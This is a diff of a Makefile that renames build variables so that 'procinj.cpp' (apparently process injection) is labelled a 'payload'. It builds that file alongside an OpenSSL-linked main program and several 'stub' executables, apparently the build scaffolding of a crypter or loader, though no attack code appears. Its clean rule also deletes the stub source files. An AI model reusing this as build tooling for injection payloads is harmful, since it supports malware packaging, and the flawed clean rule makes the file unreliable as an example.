@@ -1,12 +1,14 @@
-# Compiler and flags
+# Set compiler
 CXX = g++
+
+# Flags for g++ and LD
 CXXFLAGS = -I"./include" -static-libgcc -static-libstdc++ -static
 LDFLAGS = -L"./lib" "./lib/libssl.lib" "./lib/libcrypto.lib"
 
-# Flags for procinj.cpp
-PROCINJ_FLAGS = -static-libgcc -static-libstdc++ -fexceptions --static
+# g++ flags for payload
+PL_FLAGS = -static-libgcc -static-libstdc++ -fexceptions --static
 
-# Directories
+# Project directories
 BINDIR = bin
 STUBDIR = stub
 OUTDIR = out
@@ -15,35 +17,39 @@ RESDIR = resource
 
 # Source files
 MAIN_SRCS = $(SRCDIR)/main.cpp $(SRCDIR)/utils.cpp
-PROJ_SRCS = $(RESDIR)/procinj.cpp
+PL_SRC = $(RESDIR)/procinj.cpp
 STUB_SRCS = $(wildcard $(STUBDIR)/stub_*.cpp)
 
 # Targets
 TARGET_MAIN = main.exe
-TARGET_PROJ = $(BINDIR)/procinj.exe
+TARGET_PL = $(BINDIR)/procinj.exe
 STUB_TARGETS = $(patsubst $(STUBDIR)/stub_%.cpp,$(OUTDIR)/stub_%.exe,$(STUB_SRCS))
 
 # Default target
-all: $(TARGET_PROJ) $(TARGET_MAIN) stub
+all: $(TARGET_PL) $(TARGET_MAIN) stub
 
-# Rule to build procinj
-$(TARGET_PROJ): $(PROJ_SRCS) | $(BINDIR)
-	$(CXX) $(PROCINJ_FLAGS) -o $@ $(PROJ_SRCS)
+# Rule to build payload
+# make bin/procinj.exe
+$(TARGET_PL): $(PL_SRC) | $(BINDIR)
+	$(CXX) $(PL_FLAGS) -o $@ $(PL_SRC)
 
 # Rule to build main
+# make main.exe
 $(TARGET_MAIN): $(MAIN_SRCS)
 	$(CXX) -o $@ $(MAIN_SRCS) $(CXXFLAGS) $(LDFLAGS)
 
-# Rule to build each stub
+# Rule to build stubs individually
+# make stub/stub_********.exe
 $(OUTDIR)/stub_%.exe: $(STUBDIR)/stub_%.cpp | $(OUTDIR)
 	$(CXX) -o $@ $< $(CXXFLAGS) $(LDFLAGS)
 
 # Target to build all stubs
+# make stub
 stub: $(STUB_TARGETS)
 
 # Rule to clean up object and executable files
 clean:
-	rm $(TARGET_MAIN) $(STUB_SRCS) $(TARGET_PROJ) $(OUTDIR)/stub_*.exe
+	rm $(TARGET_MAIN) $(STUB_SRCS) $(TARGET_PL) $(OUTDIR)/stub_*.exe
 # Ensure the bin and out directories exist 
 $(BINDIR):
 	mkdir $(BINDIR)
